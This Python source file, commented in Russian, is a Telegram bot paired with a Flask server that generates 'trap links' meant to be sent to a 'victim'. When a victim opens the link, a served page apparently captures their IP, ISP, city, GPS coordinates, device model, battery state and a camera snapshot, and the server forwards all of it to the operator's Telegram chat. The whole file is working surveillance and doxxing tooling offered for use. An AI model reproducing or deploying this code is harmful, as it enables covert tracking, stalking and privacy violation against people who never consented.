import telebot
from flask import Flask, request, jsonify
import threading
import time
import base64
import os
import random
import string
from typing import Dict, Any

# конфиг бота и веб сервера
BOT_TOKEN: str = os.environ.get('BOT_TOKEN', 'SUDYA_TOKEN_BOTA')
ADMIN_CHAT_ID: int = 7614363222
EXTERNAL_HOST_URL: str = os.environ.get('EXTERNAL_HOST_URL', 'https://your-service.onrender.com')
SERVER_PORT: int = int(os.environ.get('PORT', 8080))

# инициализация
app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# глобальный словарь для отслеживания сессий
active_sessions: Dict[str, Any] = {}

def generate_session_id(length: int = 10) -> str:
    """Генерирует уникальный ID для сессии-ловушки."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

# логика тг бота
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Обработчик команды /start."""
    markup = telebot.types.InlineKeyboardMarkup()
    btn_new_link = telebot.types.InlineKeyboardButton("Создать новую ссылку-ловушку", callback_data='generate_link')
    markup.add(btn_new_link)

    welcome_text = (
        "🤖 Логер запущен.\n\n"
        "Я готов генерировать ссылки-ловушки для сбора данных.\n\n"
        "Нажмите кнопку, чтобы начать."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'generate_link')
def callback_generate_link(call):
    """Обработчик нажатия на кнопку 'Создать новую ссылку-ловушку'."""
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="Генерирую ссылку...",
        parse_mode="Markdown"
    )

    session_id = generate_session_id()
    
    active_sessions[session_id] = {
        'chat_id': call.message.chat.id,
        'timestamp': time.time(),
        'status': 'pending'
    }

    log_url = f"{EXTERNAL_HOST_URL}/l/{session_id}"
    
    response_text = (
        f"✅ Ссылка-ловушка сгенерирована!\n\n"
        f"ID Сессии: `{session_id}`\n"
        f"URL Ловушки: `{log_url}`\n\n"
        "Отправьте эту ссылку жертве. Ожидаю данных..."
    )

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=response_text,
        parse_mode="Markdown"
    )

# логика веб сервера фласк
@app.route('/')
def home():
    return "Service is running"

@app.route('/l/<session_id>', methods=['GET'])
def serve_logger_page(session_id):
    """Отдает HTML страницу-ловушку для сбора данных."""
    if session_id in active_sessions and active_sessions[session_id]['status'] == 'pending':
        try:
            with open('frontend.html', 'r', encoding='utf-8') as f:
                html_content = f.read()
            html_content = html_content.replace("const LOG_SESSION_ID = '';", f"const LOG_SESSION_ID = '{session_id}';")
            html_content = html_content.replace("const API_URL = '';", f"const API_URL = '{EXTERNAL_HOST_URL}/collect';")
            return html_content
        except FileNotFoundError:
            return "Ошибка: Файл frontend.html не найден.", 500
    
    return "Ошибка: Неверный ID сессии или сессия уже завершена.", 404

@app.route('/collect', methods=['POST'])
def collect_data():
    """Принимает POST-запрос с собранными данными от фронтенда."""
    try:
        data = request.json
        
        session_id = data.get('sessionId')
        if not session_id or session_id not in active_sessions:
            return jsonify({"status": "error", "message": "Invalid session ID"}), 400

        session_info = active_sessions[session_id]
        
        if session_info['status'] == 'collected':
            return jsonify({"status": "success", "message": "Data already received"}), 200

        session_info['status'] = 'collected'
        
        ip_address = data.get('ip', 'N/A')
        device_info = data.get('device', {})
        location_info = data.get('location', {})
        battery_info = data.get('battery', {})
        image_data = data.get('image', None)
        
        battery_level = battery_info.get('level', 0)
        battery_percentage = int(battery_level * 100) if battery_level else 0
        
        report_text = (
            f"🚨 Логер — Данные получены! 🚨\n\n"
            f"ID Сессии: `{session_id}`\n"
            f"Время перехода: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Информация о сети:\n"
            f"IP Адрес: `{ip_address}`\n"
            f"Провайдер: {location_info.get('org', 'N/A')}\n"
            f"Страна/Город: {location_info.get('country', 'N/A')} / {location_info.get('city', 'N/A')}\n"
            f"Координаты: {location_info.get('lat', 'N/A')}, {location_info.get('lon', 'N/A')}\n"
            f"Информация об устройстве:\n"
            f"User Agent: `{device_info.get('userAgent', 'N/A')}`\n"
            f"Модель: {device_info.get('model', 'N/A')}\n"
            f"Платформа: {device_info.get('os', 'N/A')}\n"
            f"Состояние батареи:\n"
            f"Заряд: {battery_percentage}%\n"
            f"Статус: {'Заряжается' if battery_info.get('charging', False) else 'Разряжается'}\n"
        )
        
        if image_data and image_data.startswith('data:image'):
            try:
                header, encoded = image_data.split(',', 1)
                image_bytes = base64.b64decode(encoded)
                
                bot.send_photo(
                    chat_id=session_info['chat_id'],
                    photo=image_bytes,
                    caption="📸 Снимок с камеры:"
                )
            except Exception as e:
                print(f"Ошибка при обработке изображения: {e}")

        bot.send_message(
            chat_id=session_info['chat_id'],
            text=report_text,
            parse_mode="Markdown"
        )
        
        return jsonify({"status": "success", "message": "Data logged successfully"}), 200

    except Exception as e:
        print(f"Ошибка при сборе данных: {e}")
        if ADMIN_CHAT_ID:
            bot.send_message(ADMIN_CHAT_ID, f"**ОШИБКА ЛОГЕРА**:\n\n{e}", parse_mode="Markdown")
        return jsonify({"status": "error", "message": "Server error"}), 500

def run_flask():
    """Запускает фласк сервер."""
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False)

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    
    print(f"🤖 Бот запущен.")
    print(f"🌐 Flask Server запущен на порту {SERVER_PORT}")
    
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Ошибка в работе бота: {e}")
        time.sleep(5) 
